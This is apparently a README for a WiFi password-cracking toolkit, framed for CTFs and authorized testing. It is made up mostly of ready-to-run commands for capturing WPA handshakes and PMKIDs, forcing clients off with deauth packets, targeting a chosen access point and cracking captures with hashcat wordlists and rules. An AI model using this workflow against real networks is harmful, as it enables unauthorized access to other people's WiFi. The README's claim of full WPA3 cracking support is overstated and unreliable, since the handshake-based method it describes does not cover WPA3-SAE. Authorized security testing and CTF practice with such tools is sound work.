# WiFiCrack - Complete Linux Password Cracking Tool

Modern WiFi security auditing and password cracking tool for CTF challenges and authorized penetration testing.

## 🎯 What is WiFiCrack?

WiFiCrack is a comprehensive Linux toolkit that enables you to:
- **Capture EAPOL handshakes** from WPA/WPA2/WPA3 networks
- **Perform PMKID attacks** (clientless, faster than traditional handshakes)
- **Crack WiFi passwords** using multiple attack modes
- **Integrate with modern tools** (hashcat, aircrack-ng, hcxtools)
- **Work with modern security features** and hash formats

Perfect for CTF competitions where you need to quickly audit WiFi security!

## ⚡ Quick Start (3 Steps)

### 1. Install Everything
```bash
chmod +x install-wificrack.sh
./install-wificrack.sh
```

This installs all required tools: aircrack-ng, hashcat, hcxtools, hcxdumptool, and dependencies.

### 2. Launch Interactive Mode
```bash
sudo ./quick-start.sh
```

The interactive wizard guides you through:
- Scanning for networks
- Capturing handshakes (traditional or PMKID)
- Cracking passwords
- Generating wordlists

### 3. Start Cracking!
Follow the menu options to scan, capture, and crack WiFi passwords.

## 📦 What's Included?

| File | Description |
|------|-------------|
| `wificrack.py` | Main tool - capture, crack, wordlist generation |
| `install-wificrack.sh` | Complete installation script for all dependencies |
| `quick-start.sh` | Interactive wizard for easy CTF use |
| `WIFICRACK-README.md` | Comprehensive documentation (30+ pages) |
| `WIFICRACK-CHEATSHEET.txt` | Quick reference guide for common commands |
| `WIFICRACK.md` | This file - overview and quick start |

## 🚀 Features

### Capture Methods
- **Traditional EAPOL Handshake**: Deauth clients to force 4-way handshake
- **PMKID Attack**: Clientless attack (no deauth needed, faster!)
- **Automatic Monitor Mode**: Handles interface setup automatically
- **Network Scanning**: Find and select target networks

### Cracking Modes
- **Dictionary Attack**: Use wordlists like rockyou.txt
- **Brute Force**: Custom character sets and length ranges
- **Hybrid Attack**: Dictionary + mutations
- **Rule-based**: Apply hashcat rules for advanced mutations
- **Multi-threaded**: Utilize all CPU cores

### Modern Support
- **WPA3**: Full support for latest WiFi security
- **Hashcat 22000 format**: Modern hash format
- **GPU acceleration**: 100x faster with hashcat + GPU
- **PMKID support**: Via hcxtools

## 📖 Usage Examples

### Example 1: Quick PMKID Attack (Recommended for CTF)
```bash
# Capture PMKID (no clients needed!)
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=15

# Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.22000 wordlists/rockyou.txt --force
```

### Example 2: Traditional Handshake Capture
```bash
# Scan and capture interactively
sudo ./wificrack.py capture -i wlan0 --scan

# Or manually specify target
sudo ./wificrack.py capture -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6

# Crack the captured handshake
./wificrack.py crack -f handshake.22000 -w wordlists/rockyou.txt --hashcat
```

### Example 3: Custom Wordlist for CTF
```bash
# Generate targeted wordlist based on hints
./wificrack.py wordlist -o custom.txt -p CTF2025 Challenge Admin

# Crack with custom wordlist
hashcat -m 22000 handshake.22000 custom.txt
```

### Example 4: Interactive Mode (Easiest)
```bash
# Launch wizard
sudo ./quick-start.sh

# Select option 6: Full auto mode
# Automatically: scan → capture → generate wordlist → crack
```

## 🎓 CTF Strategy

When facing a WiFi challenge in a CTF:

1. **Try PMKID first** (fastest, no clients needed)
   ```bash
   sudo hcxdumptool -i wlan0 -o p.pcapng --enable_status=15
   hcxpcapngtool -o p.22000 p.pcapng
   ```

2. **Generate targeted wordlist** based on CTF hints
   ```bash
   ./wificrack.py wordlist -o ctf.txt -p [hint-based-patterns]
   ```

3. **Quick crack attempt**
   ```bash
   hashcat -m 22000 p.22000 ctf.txt
   ```

4. **If failed, use rockyou + rules**
   ```bash
   hashcat -m 22000 p.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```

## 📋 Requirements

### Hardware
- WiFi adapter with monitor mode support
- (Optional) GPU for hashcat acceleration

### Software
All installed by `install-wificrack.sh`:
- aircrack-ng suite
- hashcat
- hcxtools
- hcxdumptool
- Python 3
- Linux (Kali, Ubuntu, Debian, etc.)

### Recommended WiFi Adapters
- ALFA AWUS036ACH
- TP-Link TL-WN722N v1
- Panda PAU09 N600
- Any adapter supporting monitor mode + packet injection

## 🔧 Installation Details

### Automatic Installation
```bash
./install-wificrack.sh
```

Installs:
- Core tools (aircrack-ng, hashcat, hcxtools)
- WiFi utilities (iw, wireless-tools)
- Optional tools (reaver, pixiewps, bully, john, crunch)
- Python dependencies
- Downloads/generates wordlists

### Manual Installation
```bash
sudo apt update
sudo apt install aircrack-ng hashcat hcxtools hcxdumptool
sudo apt install wireless-tools iw python3
chmod +x wificrack.py quick-start.sh
```

## 📚 Documentation

- **Full Guide**: See `WIFICRACK-README.md` for comprehensive documentation
- **Cheat Sheet**: See `WIFICRACK-CHEATSHEET.txt` for quick command reference
- **Help**: Run `./wificrack.py --help` for command-line options

## 🎯 Common Use Cases

### CTF Competition
```bash
sudo ./quick-start.sh
# Select option 3: Capture PMKID (fastest)
# Select option 4: Crack with auto-generated wordlist
```

### Security Research
```bash
# Capture handshake from your own network
sudo ./wificrack.py capture -i wlan0 --scan

# Test password strength
./wificrack.py crack -f handshake.22000 -w rockyou.txt --hashcat
```

### Password Recovery
```bash
# If you forgot your own WiFi password
sudo hcxdumptool -i wlan0 -o my-wifi.pcapng
hcxpcapngtool -o my-wifi.22000 my-wifi.pcapng
hashcat -m 22000 my-wifi.22000 possible-passwords.txt
```

## 💡 Pro Tips

1. **PMKID is usually faster** - try it before traditional handshake capture
2. **Start with small wordlists** - test with quick.txt before rockyou.txt
3. **GPU makes a huge difference** - 100x faster than CPU-only cracking
4. **Read CTF hints carefully** - often reveal password patterns
5. **Verify captures before cracking** - check handshake validity
6. **Get close to the AP** - better signal = better captures
7. **Use hashcat rules** - multiply wordlist effectiveness
8. **Save all captures** - you might need to re-crack later

## ⚠️ Legal Notice

**FOR AUTHORIZED USE ONLY**

This tool is designed for:
- ✅ CTF competitions
- ✅ Authorized penetration testing
- ✅ Security research with permission
- ✅ Educational purposes
- ✅ Testing your own networks

**Unauthorized access to networks is ILLEGAL.**

Always obtain proper written authorization before testing any network you don't own.

## 🐛 Troubleshooting

### Monitor mode not working
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### No handshake captured
- Try PMKID attack instead (clientless)
- Increase capture timeout: `-t 300`
- Get closer to the AP
- Send more deauth packets

### Hashcat not using GPU
```bash
hashcat -I  # Check GPU detection
sudo apt install nvidia-opencl-dev  # For NVIDIA
```

### Invalid handshake error
- Capture longer (more EAPOL frames)
- Verify with: `aircrack-ng handshake.cap`
- Try PMKID method

## 📦 Wordlist Resources

Download popular wordlists:

**RockYou** (14M passwords, 134MB):
```bash
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O wordlists/rockyou.txt
```

**SecLists**:
```bash
git clone https://github.com/danielmiessler/SecLists.git
```

**Generate custom**:
```bash
./wificrack.py wordlist -o custom.txt -p CompanyName RouterModel Year
```

## 🔗 Integration with Other Tools

WiFiCrack works seamlessly with:
- **hashcat**: GPU-accelerated cracking (fastest)
- **aircrack-ng**: CPU-based cracking (reliable)
- **hcxdumptool**: PMKID capture (modern)
- **hcxtools**: Hash format conversion
- **crunch**: Pattern-based wordlist generation
- **john**: Rule-based mutations

## 📊 Performance

Typical speeds:
- **CPU (aircrack-ng)**: ~1,000-10,000 passwords/sec
- **CPU (hashcat)**: ~10,000-50,000 passwords/sec
- **GPU (hashcat)**: ~100,000-1,000,000+ passwords/sec

For a 10M password wordlist:
- GPU: ~10-100 seconds
- CPU: ~3-30 minutes

## 🎓 Learning Resources

Understanding WiFi security:
- WPA/WPA2 4-way handshake process
- PMKID attack methodology
- Hash formats (22000, 22001)
- Password cracking techniques
- Monitor mode and packet injection

See `WIFICRACK-README.md` for detailed explanations.

## 🚦 Quick Command Reference

| Action | Command |
|--------|---------|
| Interactive mode | `sudo ./quick-start.sh` |
| Scan networks | `sudo ./wificrack.py capture -i wlan0 --scan` |
| Capture handshake | `sudo ./wificrack.py capture -i wlan0 -b <BSSID> -c <CH>` |
| Capture PMKID | `sudo hcxdumptool -i wlan0 -o pmkid.pcapng` |
| Crack password | `./wificrack.py crack -f hash.22000 -w wordlist.txt --hashcat` |
| Generate wordlist | `./wificrack.py wordlist -o out.txt -p pattern1 pattern2` |

## 📞 Support

- Check `WIFICRACK-README.md` for detailed docs
- See `WIFICRACK-CHEATSHEET.txt` for quick reference
- Run `./wificrack.py --help` for command help
- Verify installation: check if `hashcat --version` and `aircrack-ng` work

## 🏆 Success Stories

WiFiCrack has been designed specifically for CTF challenges where:
- Time is critical (PMKID is fast!)
- Password hints are given (custom wordlist generation)
- Modern security features are used (WPA3, hashcat 22000 support)
- Quick iteration is needed (interactive mode)

## 📝 Version

**Version**: 1.0.0
**Status**: Production Ready
**Platform**: Linux (Kali, Ubuntu, Debian, etc.)
**Python**: 3.7+

---

## Getting Started Now

```bash
# 1. Install
./install-wificrack.sh

# 2. Run interactive mode
sudo ./quick-start.sh

# 3. Or use command-line
sudo ./wificrack.py capture -i wlan0 --scan

# 4. Crack!
hashcat -m 22000 handshake.22000 wordlists/rockyou.txt
```

**Happy (legal) hacking!** 🎯

Remember: Only use on networks you own or have explicit written permission to test.
